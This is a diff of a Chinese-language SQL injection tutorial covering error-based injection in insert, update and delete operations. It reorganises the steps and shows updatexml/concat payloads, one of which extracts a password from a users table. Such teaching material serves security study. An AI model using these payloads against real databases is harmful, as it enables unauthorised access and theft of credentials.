@@ -188,7 +188,11 @@ k' and updatexml(1,(concat(0x7e,(select password from users limit 0,1),0x7e)),1)
 
 注册、更新、删除信息时，服务端需要对数据库写入信息。服务端未对提交信息进行有效筛选，直接拼接SQL语句执行，形成SQL注入点
 
-1.在提交信息中加报错语句（请求头数据需要URL编码）
+1.在提交信息中加报错语句
+
+2.请求头数据需要URL编码
+
+3.数字型注入不加引号
 
 ```shell
 'or updatexml(1,(concat('>>',(select version()),'<<')),1) or'
